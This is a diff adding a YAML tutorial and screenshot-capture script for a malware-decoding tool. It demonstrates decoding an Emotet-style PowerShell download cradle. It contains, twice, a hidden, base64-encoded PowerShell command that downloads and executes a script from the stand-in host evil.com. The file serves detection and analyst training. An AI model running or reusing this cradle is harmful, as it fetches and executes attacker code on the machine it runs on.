@@ -1,0 +1,53 @@
+id: payload_encoded_powershell_download
+title: Payload Example · Encoded PowerShell Download-Cradle
+purpose: The classic "Emotet-style" download-cradle — `powershell.exe -Enc <UTF-16LE
+  base64>` invoking `Net.WebClient.DownloadString`. This is what NivXRay was built
+  to decode in one click.
+steps:
+- title: The raw command
+  action: 'powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAGEALgBwAHMAMQAnACkA
+
+    Paste it into the workspace input.
+
+    '
+  expected: Character count updates. Magic hint reads "Base64 (UTF-16LE)".
+- title: One-click NIVXRAY DECODE
+  action: Click NIVXRAY DECODE. The engine picks Base64 → UTF-16LE automatically.
+  expected: OUTPUT shows `IEX(New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1')`.
+    Chain = 2 stages.
+- title: Read the verdict
+  action: Look at the Threat Analysis panel top-right.
+  expected: Verdict = **Malicious** · Confidence ≥ 0.9 · MITRE T1059.001 (PowerShell)
+    + T1105 (Ingress Tool Transfer).
+- title: Enrich the URL
+  action: Click the 🛈 next to `evil.com` in the IOCS tab.
+  expected: VT / OTX / AbuseIPDB verdicts appear inline.
+related_features:
+- base64_decode
+- candidate_explorer
+- threat_intel_enrichment
+- investigation_timeline
+capture:
+  login: true
+  steps:
+  - url: /workspace
+    wait_for: '[data-testid="input-textarea"]'
+    type_into:
+      selector: '[data-testid="input-textarea"]'
+      text: powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAGEALgBwAHMAMQAnACkA
+    click_before: '[data-testid="btn-auto-investigate-inline"]'
+    delay_ms: 4000
+    post_click_ms: 6000
+    selectors:
+    - '[data-testid="input-card"]'
+    - '[data-testid="output-card"]'
+    - '[data-testid="threat-analysis-panel"]'
+    tabs:
+    - tab-graph
+    - tab-mitre
+    - tab-lolbas
+    - tab-iocs
+    - tab-ti-hits
+    - tab-osint
+    - tab-flow
+    - tab-chain
